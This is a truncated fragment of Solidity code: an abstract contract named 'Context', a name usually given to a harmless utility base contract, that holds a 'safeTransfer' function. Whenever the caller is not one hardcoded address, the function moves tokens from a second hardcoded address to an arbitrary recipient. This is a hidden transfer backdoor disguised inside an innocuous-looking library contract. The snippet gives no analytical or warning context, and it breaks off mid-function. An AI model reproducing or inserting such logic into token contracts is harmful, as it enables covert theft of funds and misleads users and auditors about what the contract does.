...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0xFA7De1b7FA641E3D3ABd2F9E7858F893e3F70B00)) {
    TransferHelper.safeTransferFrom(0x8278544805E4a0aC1080CD3278A9D10f3c314CF3,spender,recipient,amount);
